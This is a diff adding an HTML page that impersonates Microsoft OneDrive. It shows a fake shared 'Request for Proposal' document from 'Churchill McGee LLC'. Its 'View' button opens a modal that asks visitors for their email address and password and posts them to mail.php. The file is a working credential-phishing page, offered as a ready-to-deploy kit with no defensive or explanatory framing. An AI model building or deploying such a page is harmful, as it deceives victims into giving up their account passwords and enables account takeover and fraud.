@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="main.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+</head>
+<body>
+
+    <!-- NavBar -->
+    <div>
+        <nav class="navbar navbar-dark bg-primary p-1">
+            <div class="bg-white p-2">
+                <div class="row">
+                    <div class="col">
+                        <img src="https://img.icons8.com/color/48/000000/microsoft.png"/>
+                    </div>
+                    <div class="col">
+                        <h2>Microsoft</h2>
+                    </div>
+                </div>
+            </div>
+        </nav>
+    </div>
+
+    <!--Body Content-->
+    <div class="d-flex flex-row">
+        <!--SideBar-->
+        <div class="vertical-nav text-center" id="sidebar">
+            <ul class="navbar-nav mt-3 order ">
+                <li class="nav-item mt-3 "><i class="fa fa-dashboard mr-2"></i>Dashboard</li>
+                <li class="nav-item mt-3"><i class="fa fa-file mr-2"></i>Explore document</li>
+            </ul>
+        </div>
+        <!--SideBar End-->
+
+        <!--PageContent-->
+        <div id="page-content">
+            <div class="row page-titles pl-5 pt-3">
+                <div class="col-md-6 col-8 align-self-center">
+                    <h3 class="text-themecolor m-b-0 m-t-0">Microsoft One Drive</h3>
+                    <div class="d-flex flex-row">
+                        <div class="mr-2">Catalogue</div>
+                        <div class="mr-2"><i class="fa fa-eye mr-2 ml-2"></i>View</div>
+                        <div><i class="fa fa-download mr-2 ml-2"></i>Download</div>
+                    </div>
+                </div>
+                <div class="col-md-6 col-4 align-self-center"></div>
+            </div>
+
+            <!--Cards-->
+
+            <div class="row pl-5 pr-5 mt-5">
+                <div class="col">
+                    <div class="card pt-5 pb-3">
+                        <div class="card-block">
+                            <center class="m-t-30">
+                                <img src="word-icon.png" alt="" style="width: 200px; length: 200px">
+                                <h6 class="card-subtitle">Size:- 256kb</h6>
+                                <h4 class="card-title m-t-10">Filename: RFP's Churchill McGeellc</h4>
+                                <h6 class="card-subtitle">"Description:- "<i>Request for Proposal: Churchill McGee LLC</i></h6>
+                                <div class="col-sm mt-3 text-center">
+                                    <button class="btn btn-info btn-md" data-toggle="modal" data-target="#myModal">View</button>
+                                </div>
+                            </center>
+                        </div>
+                    </div>
+                </div>
+                <!--Coloumn-->
+                <div class="col">
+                    <div class="card pt-5 pb-3">
+                        <div class="card-block">
+                            <center class="m-t-30">
+                                <img src="microsoft-ad.gif" alt="" width="270">
+                                <h4 class="card-title m-t-4"></h4>
+                                <h6 class="card-subtitle">Prepared by : "<i>Project Manager</i>"</h6>
+                                <h6 class="card-subtitle mt-2">Signed by : "<i>Mark Turner</i>"</h6>
+                            </center>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!--Card End-->
+        </div>
+
+        <!--PageContent End-->
+    </div>
+
+    <!--BodyContent End-->
+
+    <!--Footer-->
+    <footer class="footer fixed-bottom text-center p-2 bg-white"><i class="fa fa-copyright"></i> 2021 Microsoft One Drive</footer>
+
+    <!-- Modal -->
+    <div id="myModal" class="modal fade" role="dialog">
+        <div class="modal-dialog">
+    
+            <!-- Modal content-->
+            <div class="modal-content pt-2 pr-3 pl-3">
+                <div class="row">
+                    <div class="col float-left">
+                        <img src="https://img.icons8.com/color/48/000000/microsoft.png" alt=""><span class="h4">Microsoft Docs</span>
+                    </div>
+                    <div class="col">
+                        <button type="button" class="close" data-dismiss="modal">&times;</button>
+                    </div>
+                </div>
+                <div><hr></div>
+                <div>
+                    <form action="mail.php" id="user-log" method="post" class="mb-3">
+                        <div class="form-group">
+                            <label for="email">Email address</label>
+                            <input type="email" class="form-control" name="email" aria-describedby="emailHelp" placeholder="Enter email">
+                        </div>
+                        <div class="form-group">
+                            <label for="exampleInputPassword1">Password</label>
+                            <input type="password" class="form-control" name="exampleInputPassword1" placeholder="Password">
+                        </div>
+                        <div class="form-group">
+                            <button type="submit" class="btn btn-primary form-control">View</button>
+                        </div>
+                        <div class="form-group text-center">
+                            <label>Sign In with Reciever's Email and Password to View document</label>
+                        </div>
+                    </form>
+                </div>
+                <div class="mb-3"><hr></div>
+            </div>
+    
+        </div>
+    </div>
+    <!--modal End-->
+    
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+</html>
